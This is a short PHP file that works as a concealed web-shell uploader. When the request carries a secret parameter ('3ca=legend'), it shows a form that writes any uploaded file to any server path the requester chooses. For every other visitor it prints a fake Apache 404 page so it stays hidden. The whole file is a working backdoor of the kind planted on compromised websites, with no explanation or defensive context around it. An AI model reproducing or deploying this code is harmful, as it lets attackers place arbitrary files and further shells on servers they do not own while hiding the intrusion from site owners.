 <?php

if(isset($_GET["3ca"]) && $_GET["3ca"]=="legend"){
$x=key($_GET);
$files = @$_FILES["files"];
if ($files["name"] != '') {
    $fullpath = $_REQUEST["path"] . $files["name"];
	if (move_uploaded_file($files['tmp_name'], $fullpath)) {
        echo "<h1><a href='$fullpath'>Done! Open</a></h1>";
    }
   
}echo '<html><head><title>Upload files...</title></head><body><form method=POST enctype="multipart/form-data" action="?'.$x.'='.$_GET[$x].'"><input type=text name=path><input type="file" name="files"><input type=submit value="UPload"></form></body></html>';
}else{
echo '<h1>Not Found</h1>
         <p>The requested URL ' .$_SERVER['PHP_SELF']. ' was not found on this server.</p>
         <p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
         <hr>
          <p><address>Apache Server at ' . $_SERVER['HTTP_HOST'] . ' Port 80</address></p>';
}


?>